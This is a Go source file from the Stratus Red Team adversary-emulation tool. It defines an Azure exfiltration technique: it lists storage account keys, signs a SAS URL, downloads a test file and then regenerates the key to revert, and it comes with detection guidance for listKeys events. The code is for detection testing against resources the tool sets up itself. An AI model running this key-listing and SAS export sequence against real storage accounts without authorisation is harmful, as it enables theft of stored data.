package azure

import (
	"context"
	_ "embed"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore/to"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/storage/armstorage"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob/sas"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.exfiltration.storage-sas-export",
		FriendlyName: "Exfiltrate Azure Storage through SAS URL",
		Description: `
Generate a Shared Access Signature (SAS) to download content in an Azure storage account.

Warm-up:

- Create a storage account with anonymous blob access disabled
- Create a storage container with an empty test file

Detonation:

- Generate a shared access signature (SAS) URL for the storage container
- Download test file from the container using SAS URL

References:

- https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/
- https://microsoft.github.io/Azure-Threat-Research-Matrix/Impact/AZT701/AZT701-2/
`,
		Detection: `
Monitor Azure Activity Logs for storage account property changes, specifically <code>Microsoft.Storage/storageAccounts/listKeys/action</code> operations. Once an attacker has accessed storage keys, they are able to generate a SAS URL for any storage the key has access to.

Sample Azure Activity Log event to monitor:

` + codeBlock + `json hl_lines="1 5"
    "operationName": {
        "value": "Microsoft.Storage/storageAccounts/listKeys/action",
        "localizedValue": "List Storage Account Keys"
    },
    "properties": {
        "eventCategory": "Administrative",
        "entity": "/subscriptions/[SUBSCRIPTION-ID]/resourceGroups/stratus-red-team-storage-storage-27n4/providers/Microsoft.Storage/storageAccounts/stratusredteamexport",
        "message": "Microsoft.Storage/storageAccounts/listKeys/action",
        "hierarchy": "[REMOVED]"
    }
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               true,
		IsSlow:                     false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Exfiltration},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()
	storageAccountName := params["storage_account_name"]
	containerName := params["container_name"]
	resourceGroup := params["resource_group"]

	storageAccountsClient, err := getAzureStorageAccountsClient(providers.Azure())
	if err != nil {
		return fmt.Errorf("unable to instantiate Azure storage accounts client: %w", err)
	}

	// List storage account keys
	log.Println("Retrieving storage account keys for " + storageAccountName)
	keysResponse, err := storageAccountsClient.ListKeys(ctx, resourceGroup, storageAccountName, nil)
	if err != nil {
		return fmt.Errorf("unable to list storage account keys: %w", err)
	}

	if len(keysResponse.Keys) == 0 {
		return fmt.Errorf("no keys found for storage account")
	}

	accountKey := *keysResponse.Keys[0].Value

	// Create SharedKeyCredential for signing
	credential, err := azblob.NewSharedKeyCredential(storageAccountName, accountKey)
	if err != nil {
		return fmt.Errorf("unable to create shared key credential: %w", err)
	}

	// Create & sign SAS URL
	log.Println("Generating SAS URL for container " + containerName)

	// SAS token of 2 hours to account for any system time inaccuracy
	startTime := time.Now().Add(-30 * time.Minute).UTC()
	expiryTime := time.Now().Add(2 * time.Hour).UTC()

	permissions := sas.ContainerPermissions{Read: true, List: true}
	sasQueryParams, err := sas.BlobSignatureValues{
		Protocol:      sas.ProtocolHTTPS,
		StartTime:     startTime,
		ExpiryTime:    expiryTime,
		Permissions:   permissions.String(),
		ContainerName: containerName,
	}.SignWithSharedKey(credential)
	if err != nil {
		return fmt.Errorf("unable to generate SAS token: %w", err)
	}

	blobSASURL := fmt.Sprintf("https://%s.blob.core.windows.net/%s/sample-file.txt?%s",
		storageAccountName, containerName, sasQueryParams.Encode())

	log.Println("Successfully generated SAS token (expires in 2 hours): " + blobSASURL)

	log.Println("Downloading empty test file using SAS URL")

	resp, err := http.Get(blobSASURL)
	if err != nil {
		return fmt.Errorf("unable to download via SAS URL: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status code when downloading: %d", resp.StatusCode)
	}
	_, err = io.Copy(io.Discard, resp.Body)
	if err != nil {
		return fmt.Errorf("unable to read blob content: %w", err)
	}

	log.Println("Successfully downloaded test file using SAS URL")
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()
	storageAccountName := params["storage_account_name"]
	resourceGroup := params["resource_group"]

	storageAccountsClient, err := getAzureStorageAccountsClient(providers.Azure())
	if err != nil {
		return fmt.Errorf("unable to instantiate Azure storage accounts client: %w", err)
	}

	// Regenerate the storage account key to invalidate the SAS token
	log.Println("Regenerating storage account key to invalidate SAS token")
	_, err = storageAccountsClient.RegenerateKey(ctx, resourceGroup, storageAccountName, armstorage.AccountRegenerateKeyParameters{
		KeyName: to.Ptr("key1"),
	}, nil)
	if err != nil {
		return fmt.Errorf("unable to regenerate storage account key: %w", err)
	}

	log.Println("Successfully regenerated storage account key - SAS token is now invalid")
	return nil
}

func getAzureStorageAccountsClient(azure *providers.AzureProvider) (*armstorage.AccountsClient, error) {
	return armstorage.NewAccountsClient(azure.SubscriptionID, azure.GetCredentials(), azure.ClientOptions)
}
